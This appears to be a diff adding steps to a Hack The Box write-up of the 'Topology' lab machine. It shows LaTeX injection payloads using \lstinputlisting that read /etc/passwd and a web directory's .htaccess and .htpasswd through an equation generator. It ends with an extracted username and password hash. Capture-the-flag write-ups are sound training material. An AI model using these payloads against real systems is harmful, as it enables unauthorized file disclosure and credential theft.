@@ -10,3 +10,34 @@ nmap -Pn -sC -sV -p 22,80 10.10.11.217
 
 HTTP
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1d3e4cab-23f5-4ea8-a735-21843a42d7f9)
+
+Latex Equation Generator
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ad08b5ff-4423-4b4d-812a-11baf54aad51)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c11f8c7b-5fe3-4090-80de-432c5c73cb73)
+
+Subdomain
+```
+http://latex.topology.htb/
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/23789ad6-aaf8-4b16-8d3c-a1cd682b99ad)
+
+Latex Injection LFI
+```
+$\lstinputlisting{/etc/passwd}$
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/42f0bed3-ee29-42cd-834c-155489d60216)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9f36e1dd-a7ec-4958-8954-be457431bdb2)
+```
+$\lstinputlisting{/var/www/dev/.htaccess}$
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4ae5a043-96cc-4fec-885d-ad5e9fc40c3e)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7a59670b-97b4-46fe-b381-f61626e7eb93)
+```
+$\lstinputlisting{/var/www/dev/.htpasswd}$
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/48421c5f-fc30-48c0-a114-0c6e1b7667f8)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f59ad50d-05ab-42ff-83a5-8f8cb3e56d44)
+```
+Credentials:
+vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+```
